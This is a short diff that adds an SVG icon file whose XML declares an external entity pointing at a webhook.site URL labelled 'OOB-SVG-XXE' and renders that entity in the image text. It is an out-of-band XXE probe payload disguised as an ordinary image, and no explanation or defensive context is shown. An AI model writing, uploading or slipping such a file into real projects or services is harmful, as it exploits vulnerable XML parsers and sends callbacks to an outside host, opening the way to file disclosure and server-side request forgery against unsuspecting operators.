@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "https://webhook.site/eac420e6-7330-4be4-855e-f2f796cabde2/OOB-SVG-XXE"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><text x="2" y="20">&xxe;</text></svg>
